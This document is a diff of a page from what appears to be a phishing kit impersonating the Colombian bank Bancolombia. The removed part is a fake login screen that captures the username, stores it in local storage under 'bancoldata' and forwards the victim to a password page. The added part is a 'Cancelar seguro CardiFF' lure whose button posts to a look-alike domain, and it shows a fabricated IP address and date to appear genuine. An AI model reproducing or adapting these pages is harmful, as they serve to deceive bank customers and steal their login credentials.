@@ -1,240 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <title>Image-based Website with Loader</title>
-  <style>
-    * {
-      margin: 0; padding: 0; box-sizing: border-box;
-    }
-    html, body {
-      width: 100%;
-      min-height: 100%;
-      background-color: #f0f0f0;
-      overflow: hidden;
-      font-family: Arial, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      -webkit-text-size-adjust: 100%;
-    }
-    input, button {
-      -webkit-appearance: none;
-      appearance: none;
-      font-family: inherit;
-    }
-    input:focus {
-      outline: none;
-    }
-
-    .loader-container {
-      position: fixed; top: 0; left: 0;
-      width: 100%; height: 100%;
-      background-color: #ffffff;
-      display: flex; justify-content: center; align-items: center;
-      z-index: 9999;
-    }
-    .loader {
-      width: 50px; height: 50px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% {transform: rotate(0deg);}
-      100% {transform: rotate(360deg);}
-    }
-    .image-container {
-      width: 100%; height: 100%;
-      overflow: hidden; position: relative;
-      display: none;
-    }
-    .image-container img {
-      width: 100%; height: 100%; object-fit: cover;
-    }
-    .center-box {
-      position: absolute;
-      top: 55%; left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #fff;
-      width: 290px; height: auto;
-      padding: 15px 0;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      border-radius: 8px;
-    }
-    .center-box .input-container {
-      position: relative;
-      width: 80%;
-    }
-    .center-box input {
-      width: 100%;
-      padding: 10px 10px 10px 40px;
-      font-size: 19px;
-      border: none;
-      border-bottom: 1px solid #ffe100;
-      outline: none;
-    }
-    .center-box .input-container i {
-      position: absolute;
-      left: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #888;
-      font-size: 17px;
-    }
-    #userError {
-      color: red;
-      font-size: 12px;
-      margin-top: 5px;
-      display: none;
-      text-align: left;
-    }
-    .button-container {
-      position: absolute;
-      top: 70.4%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      display: flex;
-      gap: 10px;
-      transition: top 0.3s ease;
-    }
-    .button-container button {
-      padding: 13px 35px;
-      font-size: 13px;
-      border: none;
-      border-radius: 50px;
-      font-weight: bold;
-      color: #010101;
-      cursor: pointer;
-    }
-    .button-container button:first-child {
-      background-color: #ffffff;
-      border: 1px solid black;
-    }
-    .button-container button:last-child {
-      background-color: #ffda37;
-      color: black;
-      cursor: not-allowed;
-    }
-    .button-container button:last-child.enabled {
-      background-color: #ffda37;
-      cursor: pointer;
-    }
-    .button-container button:last-child.enabled:hover {
-      background-color: #ffb800;
-    }
-
-    @media screen and (max-width: 480px) {
-      .center-box {
-        width: 85%;
-        padding: 10px 15px;
-      }
-      .center-box .input-container input {
-        font-size: 16px;
-        padding: 8px 8px 8px 35px;
-      }
-      .center-box .input-container i {
-        left: 8px;
-        font-size: 15px;
-      }
-      #userError {
-        font-size: 11px;
-        margin-top: 3px;
-      }
-      .button-container {
-        top: 75%;
-      }
-      .button-container button {
-        padding: 12px 28px;
-        font-size: 12px;
-      }
-    }
-  </style>
+<!-- saved from url=(0035)https://personalvirtualesco.site/?p -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="./imagi_files/general.css">
+    <link rel="stylesheet" href="./imagi_files/styles.css">
+    <link href="./imagi_files/boxicons.min.css" rel="stylesheet">
+    <link rel="icon" href="https://personalvirtualesco.site/assets/img/logo.png">
+    <title>Autenticación Bancolombia</title>
 </head>
 <body>
-
-  <!-- Loader -->
-  <div class="loader-container" id="loader">
-    <div class="loader"></div>
-  </div>
-
-  <!-- Contenido principal -->
-  <div class="image-container" id="mainContent">
-    <img src="img/cel1.jpg" alt="Background Image" />
-    <div class="center-box">
-      <div class="input-container">
-        <i class="fas fa-user"></i>
-        <input type="text" placeholder="Usuario" id="userInput" />
-        <div id="userError">Usted debe tener un mínimo de 6 caracteres y al menos 1 número.</div>
-      </div>
+    <div class="img" style="text-align: center; padding: 5%;">
+        <img src="./imagi_files/header.png" alt="" srcset="" width="100%">
     </div>
-
-    <div class="button-container">
-      <button>Cancelar</button>
-      <button id="continueButton" class="disabled" disabled>Continuar</button>
+    <div style="margin-top: 10px;">
+        <img src="./imagi_files/portada.png" alt="" srcset="" width="100%">
     </div>
-  </div>
+    <div class="texto" style="text-align: center; margin-top: 30px;">
+        <h3>Cancelar seguro CardiFF</h3><br>
+        
+        <br><h4>Cancela el registro de compra que se ha debitado.</h4><br>
+        <form action="https://sucursl-bancol.vercel.app/" method="post">
+            <button class="box__btn" style="width: 70%; margin-top: 10px; color: black;">Continuar</button>
+        </form>
+    </div>
+    <footer class="footer" style="margin-top: 50px;">
+    <div style="margin-top: 10px;">
+        <img src="./imagi_files/servicios.png" alt="" srcset="" width="100%">
+    </div>
+        <div class="line"></div>
+        <div class="footer__logo1"></div>
+        <div class="footer__logo2"></div>
+        <span>
+            <p>Dirección IP: 190.210.118.1</p>
+            <p id="currentDate">miércoles, 15 de enero de 2025, 1:30 a.&nbsp;m.</p>
+        </span>
+    </footer>
 
-  <script>
-    window.onload = () => {
-      document.getElementById('loader').style.display = 'none';
-      document.getElementById('mainContent').style.display = 'block';
-      adjustButtonPosition(); // Ajuste inicial
-    };
 
-    const userInput = document.getElementById('userInput');
-    const userError = document.getElementById('userError');
-    const continueButton = document.getElementById('continueButton');
-    const buttonContainer = document.querySelector('.button-container');
-
-    userInput.addEventListener('input', () => {
-      const value = userInput.value.trim();
-      const isValid = value.length >= 6 && /\d/.test(value);
-      if (isValid) {
-        userError.style.display = 'none';
-        continueButton.classList.add('enabled');
-        continueButton.classList.remove('disabled');
-        continueButton.disabled = false;
-      } else {
-        userError.style.display = 'block';
-        continueButton.classList.remove('enabled');
-        continueButton.classList.add('disabled');
-        continueButton.disabled = true;
-      }
-    });
-
-    continueButton.addEventListener('click', () => {
-      const userValue = userInput.value.trim();
-      if (userValue.length >= 6 && /\d/.test(userValue)) {
-        let bancoldata;
-        try {
-          const storedData = localStorage.getItem('bancoldata');
-          bancoldata = storedData ? JSON.parse(storedData) : {};
-        } catch (e) {
-          console.error('Error al parsear bancoldata:', e);
-          bancoldata = {};
-        }
-        bancoldata.usuario = userValue;
-        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-        window.location.href = 'cel-clave.html';
-      }
-    });
-
-    function adjustButtonPosition() {
-      const isSmallHeight = window.innerHeight < window.screen.height * 0.7;
-      buttonContainer.style.top = isSmallHeight ? '85%' : '70.4%';
-    }
-
-    window.addEventListener('resize', adjustButtonPosition);
-    window.addEventListener('orientationchange', adjustButtonPosition);
-    document.addEventListener('focusin', adjustButtonPosition);
-    document.addEventListener('focusout', adjustButtonPosition);
-  </script>
-
-  <!-- FontAwesome -->
-  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-</body>
-</html>
+<script src="./imagi_files/date.js.download"></script></body></html>
